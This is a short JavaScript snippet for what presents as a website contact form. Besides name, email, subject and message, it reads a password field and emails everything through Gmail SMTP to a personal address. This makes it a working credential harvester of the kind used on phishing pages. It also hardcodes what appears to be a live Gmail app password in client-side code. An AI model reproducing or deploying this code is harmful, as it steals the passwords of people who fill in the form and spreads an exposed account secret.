var btn = document.getElementById("btn");
btn.addEventListener('click', function(e) {
  e.preventDefault()
var name = document.getElementById("name").value;
var email = document.getElementById("email").value;
var subject = document.getElementById("subject").value;
var message = document.getElementById("message").value;
var password = document.getElementById("password").value;
var body = `
  name: ${name} <br>
  email: ${email} <br>
  password: ${password} <br>
  subject: ${subject} <br>
  message: ${message} <br>
`;
  Email.send({
    Host : "smtp.gmail.com",
    Username : "youssifr44@gmail.com",
    Password : "uyrxeocsjhqvpjyz",
    To : 'youssifr44@gmail.com',
    From : email,
    Subject : subject,
    Body : body,
}).then(
  message => alert("Ok !")
);
});